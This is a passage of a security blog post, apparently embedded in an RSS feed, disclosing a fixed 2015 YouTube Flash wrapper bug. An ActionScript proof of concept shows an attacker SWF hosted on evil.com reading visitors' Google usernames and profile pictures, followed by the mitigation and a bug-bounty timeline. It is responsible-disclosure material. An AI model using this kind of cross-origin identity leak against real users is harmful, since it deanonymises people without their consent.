<p>From there Evil Wrapper can access YoutubeWrapper.getChildAt(0).loaderInfo.sharedEvents which is the interface between Youtube Wrapper and the Main App. Evil Wrapper can send an event to the Youtube Wrapper, the Youtube Wrapper will provide the user info in the event.data property and Evil Wrapper can then read the event.data value.<br />
Proof of Concept :</p>
<p>Evil Wrapper code was like this</p>
<pre><code >var loader = new Loader();<br />
// Load the Youtube Wrapper<br />
loader.load(new URLRequest("https://www.youtube.com/v/[VIDEO_ID]"));<br />
var youtubeWrapper = loader.content;<br />
// Access the Youtube Wrapper appLoader object<br />
var appLoader = youtubeWrapper.getChildAt(0);<br />
// Access the loaderInfo.sharedEvents of appLoader<br />
var LeakingSharedEvents = appLoader.contentLoaderInfo.sharedEvents;</p>
<p>// Prepare the event to send to Youtube Wrapper<br />
var leakEvent = new Event("Request_username");<br />
leakEvent.data = new Object();<br />
// Send the leakEvent to the LeakingSharedEvents<br />
LeakingSharedEvents.dispatchEvent(leakEvent);</p>
<p>// The username is now accessible in the event.data property<br />
trace(leakEvent.data.user_name);<br />
trace(leakEvent.data.user_picture);</code></pre>
<p>POC workflow :</p>
<p><img loading="lazy" class="wp-image-40 aligncenter" src="/wp-content/uploads/2017/08/Diagramme2.svg" alt="" width="800" height="287" /><br />
Attack scenario:<br />
Prerequisite: The victim is logged in Google and have Flash player<br />
(1) The victim visits the attacker webpage evil.com/evil.html which contains a Flash object evil.com/evil.swf<br />
(2) evil.swf loads Youtube wrapper (https://www.youtube.com/v/[VIDEO_ID]) and retrieves the user Google username (4-5-6)<br />
evil.com now knows the username of it&#8217;s visitors. In addition, as the profile picture link is unique, it is possible to uniquely identify the user&#8217;s Google account.</p>
<p>Impact:<br />
Any website could use this to know the identity of it&#8217;s users, if they are connected to Google. Imagine how you would feel if you visit a random website and this website displays your name and your picture!</p>
<p>Mitigation:<br />
To resolve this issue, Youtube Wrapper stopped writing the user info in the event.data property and instead sends it directly to the Main App. That way even if Evil Wrapper sends an event to Youtube Wrapper, it wouldn&#8217;t receive the user info as it would be directly sent to the Main App.</p>
<p>Timeline:<br />
08/27/2015 &#8211; reported to Google VRP<br />
09/09/2015 &#8211; issue fixed and reward <img loading="lazy" class="alignnone wp-image-44 size-full" src="/wp-content/uploads/2017/08/1-star.png" alt="" width="60" height="14" /><br />
This was a simple bug and I hope it helps you understand the basic challenges here. You can read about another bug where we actually execute arbitrary Flash code in youtube.com in <a href="/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/"><strong>Part 2</strong></a>.</p>

<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2017%2F08%2Fadvanced-flash-vulnerabilities-in-youtube%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
]]></content:encoded>
					
					<wfw:commentRss>/2017/08/advanced-flash-vulnerabilities-in-youtube/feed/</wfw:commentRss>
			<slash:comments>7</slash:comments>
		
		
		<post-id xmlns="com-wordpress:feed-additions:1">8</post-id>	</item>
	</channel>
</rss>
